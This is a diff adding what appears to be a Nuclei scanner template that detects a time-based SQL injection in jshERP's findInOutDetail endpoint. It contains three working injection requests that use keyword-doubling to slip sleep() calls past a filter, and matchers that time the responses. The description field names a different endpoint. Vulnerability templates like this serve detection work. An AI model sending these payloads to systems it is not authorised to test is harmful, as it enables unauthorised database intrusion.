@@ -1,0 +1,48 @@
+id: jserp-findInOutDetail-sqli
+info:
+  name: jserp-findInOutDetail-sqli
+  author: apple
+  severity: high
+  description: jserp-getListWithStock-sqli
+  reference:
+    - https://github.com/jishenghua/jshERP/issues/99
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /jshERP-boot/depotHead/findInOutDetail?organId=&number=&materialParam=xxxxxxxxxxxxxxxxxxxxxxxx&depotId=11111&beginTime=2024-01-01&endTime=2024-01-11&type=%E5%85%A5%E5%BA%93&creator=&organizationId=&remark=&column=if(1,(s%20selectelect%20sleep(3)),(s%20selectelect%20sleep(3)))&order=asc+limit+%3f,%3f+-'-&order=desc&field=id,,rowIndex,number,barCode,mname,standard,model,mUnit,operNumber,unitPrice,allPrice,taxRate,taxMoney,sname,dname,operTime,newRemark&currentPage=1&pageSize=10 HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+      - |+
+        GET /jshERP-boot/depotHead/findInOutDetail?organId=&number=&materialParam=xxxxxxxxxxxxxxxxxxxxxxxx&depotId=11111&beginTime=2024-01-01&endTime=2024-01-11&type=%E5%85%A5%E5%BA%93&creator=&organizationId=&remark=&column=if(1,(s%20selectelect%20sleep(6)),(s%20selectelect%20sleep(6)))&order=asc+limit+%3f,%3f+-'-&order=desc&field=id,,rowIndex,number,barCode,mname,standard,model,mUnit,operNumber,unitPrice,allPrice,taxRate,taxMoney,sname,dname,operTime,newRemark&currentPage=1&pageSize=10 HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+      - |+
+        GET /jshERP-boot/depotHead/findInOutDetail?organId=&number=&materialParam=xxxxxxxxxxxxxxxxxxxxxxxx&depotId=11111&beginTime=2024-01-01&endTime=2024-01-11&type=%E5%85%A5%E5%BA%93&creator=&organizationId=&remark=&column=if(1,(s%20selectelect%20sleep(9)),(s%20selectelect%20sleep(9)))&order=asc+limit+%3f,%3f+-'-&order=desc&field=id,,rowIndex,number,barCode,mname,standard,model,mUnit,operNumber,unitPrice,allPrice,taxRate,taxMoney,sname,dname,operTime,newRemark&currentPage=1&pageSize=10 HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
